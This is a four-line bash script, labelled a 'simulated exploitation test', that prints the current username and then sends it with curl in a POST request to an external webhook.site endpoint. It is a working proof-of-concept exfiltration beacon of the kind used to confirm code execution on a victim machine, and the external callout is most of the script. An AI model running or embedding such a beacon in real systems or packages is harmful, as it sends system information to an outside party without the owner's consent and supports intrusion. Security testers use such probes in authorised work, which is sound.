#!/bin/bash
echo "Simulated exploitation test"
echo "Running as: $(whoami)"
curl -X POST -d "whoami=$(whoami)" https://webhook.site/d1f19790-65c7-4d88-baff-d426e8746eff
